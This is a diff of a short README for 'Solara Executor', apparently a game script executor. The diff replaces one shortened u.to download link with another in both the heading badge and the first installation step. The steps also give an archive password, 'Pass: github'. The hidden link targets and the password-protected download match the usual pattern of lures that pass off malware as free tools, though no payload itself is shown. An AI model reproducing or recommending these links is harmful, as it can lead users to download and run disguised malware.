@@ -1,9 +1,9 @@
-# Solara Executor [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://u.to/-kXiIA)
+# Solara Executor [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://u.to/dXPjIA)
  
 
 ## Installation
 To install Solara Executor, follow these simple steps:
-1. [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://u.to/-kXiIA)
+1. [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://u.to/dXPjIA)
 
 2. **Pass: github**
   
